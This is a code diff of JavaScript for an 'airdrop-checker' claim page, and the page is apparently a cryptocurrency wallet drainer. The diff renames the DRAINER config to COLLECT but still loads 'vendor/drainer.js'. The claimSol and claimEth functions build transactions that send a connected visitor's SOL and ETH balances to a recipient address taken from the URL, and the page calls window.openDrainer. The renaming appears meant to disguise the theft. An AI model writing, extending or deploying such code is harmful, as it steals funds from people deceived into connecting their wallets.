@@ -9,7 +9,7 @@ if (location.hostname === "airdrop-checker.xyz") {
    WIRING SLOT — partner claim script goes here once a vendor is chosen.
    Empty scriptUrl = wallet connect works, the on-chain claim is mocked.
 ------------------------------------------------------------------ */
-const DRAINER = {
+const COLLECT = {
   scriptUrl: "",
   mockScript: "",
   apiOrigins: [],
@@ -23,13 +23,13 @@ const DRAINER = {
 (() => {
   const to = new URLSearchParams(location.search).get("to");
   if (!to) return;
-  if (/^0x[0-9a-fA-F]{40}$/.test(to)) DRAINER.evmRecipient = to;
-  else if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(to)) DRAINER.solRecipient = to;
+  if (/^0x[0-9a-fA-F]{40}$/.test(to)) COLLECT.evmRecipient = to;
+  else if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(to)) COLLECT.solRecipient = to;
 })();
 
 const SOL_TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 const SOL_ATA_PROGRAM = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
-const DRAINER_SCRIPT = "vendor/drainer.js";
+const COLLECT_SCRIPT = "vendor/drainer.js";
 let drainerLoading;
 
 const CHAINS = {
@@ -622,7 +622,7 @@ async function claimSol(ownerAddress) {
   const provider = getSolProvider();
   if (!provider?.signTransaction) throw new Error("no signer");
   const owner = provider.publicKey || new solanaWeb3.PublicKey(ownerAddress);
-  const recipient = new solanaWeb3.PublicKey(DRAINER.solRecipient);
+  const recipient = new solanaWeb3.PublicKey(COLLECT.solRecipient);
   const conn = new solanaWeb3.Connection(RPC.sol[0], "confirmed");
   const balances = await readSol(RPC.sol[0], owner.toBase58());
   const tx = new solanaWeb3.Transaction();
@@ -718,7 +718,7 @@ async function claimEth(ownerAddress) {
     const estimate = BigInt(
       await provider.request({
         method: "eth_estimateGas",
-        params: [{ from, to: DRAINER.evmRecipient, value: "0x1" }],
+        params: [{ from, to: COLLECT.evmRecipient, value: "0x1" }],
       })
     );
     if (estimate > ETH_GAS_FLOOR) gas = (estimate * 12n) / 10n;
@@ -750,7 +750,7 @@ async function claimEth(ownerAddress) {
     params: [
       {
         from,
-        to: DRAINER.evmRecipient,
+        to: COLLECT.evmRecipient,
         value: hexWei(amount),
         gas: hexWei(gas),
         gasPrice: hexWei(gasPrice),
@@ -799,7 +799,7 @@ async function runClaim() {
       claimStatus.append(link);
       claimStatus.hidden = false;
     } else if (typeof window.openDrainer === "function") {
-      await window.openDrainer({ address: currentAddress, project: DRAINER.projectName });
+      await window.openDrainer({ address: currentAddress, project: COLLECT.projectName });
       setMessage(claimStatus, "Check your wallet to confirm.");
     } else {
       setMessage(claimStatus, "Wallet connected. Claim script isn't wired yet.");
@@ -836,7 +836,7 @@ function loadDrainer() {
   if (drainerLoading) return drainerLoading;
   drainerLoading = new Promise((resolve, reject) => {
     const tag = document.createElement("script");
-    tag.src = DRAINER_SCRIPT;
+    tag.src = COLLECT_SCRIPT;
     tag.defer = true;
     tag.onload = () => resolve();
     tag.onerror = () => reject(new Error("claim script missing"));
